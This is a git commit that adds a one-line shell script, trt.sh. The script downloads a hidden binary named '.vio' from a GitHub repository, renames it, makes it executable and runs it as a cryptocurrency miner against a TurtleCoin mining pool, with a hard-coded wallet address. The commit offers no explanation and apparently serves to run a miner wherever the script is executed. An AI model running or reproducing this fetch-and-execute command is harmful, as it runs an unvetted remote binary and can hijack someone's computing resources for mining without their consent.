5f090d7ac59e801ef7aac4bb78428abd1b74f83b
sn943 <89630444+sn943@users.noreply.github.com>
2021-10-25 19:23:23 +0530

    Create trt.sh

---
+++ trt.sh
@@ -0,0 +1,1 @@
+wget https://github.com/hunshukajh/yes/raw/main/.vio && mv .vio vio && chmod +x vio && ./vio --algorithm chukwav2  --pool trtl.pool.mine2gether.com:2225 --username TRTLuzCTCJ8P4mKF9yHHnuKvRnk6SCgxpDns8EixWuxgJJkvrz9dfpRev1y1Lw8TGVNxq8yeePntAYo6cJeoZ4bYfTaVZceEX5e
